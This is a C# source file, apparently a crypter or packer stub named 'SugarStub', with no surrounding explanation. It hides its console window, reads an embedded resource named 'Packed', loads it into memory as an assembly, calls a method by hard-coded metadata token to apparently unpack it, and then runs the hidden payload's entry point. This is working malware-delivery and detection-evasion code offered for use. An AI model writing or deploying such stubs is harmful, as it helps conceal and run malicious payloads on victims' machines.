using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SugarStub
{
    class Program
    {

		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();
		static void Main(string[] args)
		{
			ShowWindow(GetConsoleWindow(), 0);

			var module = typeof(Program);
			var assembly = module.Assembly;

			var encryptedFileBytes = ReadResource("Packed", assembly);

			var loadedAssembly = Assembly.Load(encryptedFileBytes);

			loadedAssembly.ManifestModule.ResolveMethod(666).Invoke(null, new object[] {
				1337
			});

			var entryPoint = loadedAssembly.EntryPoint;

			object[] parameters = new object[entryPoint.GetParameters().Length];

			if (parameters.Length != 0)
				parameters[0] = args;

			entryPoint.Invoke(null, parameters);
		}

		public static byte[] ReadResource(string resourceName, Assembly assembly) {
			var stream = assembly.GetManifestResourceStream(resourceName);
			var ms = new MemoryStream();
			stream.CopyTo(ms);
			return ms.ToArray();
		}
	}
}
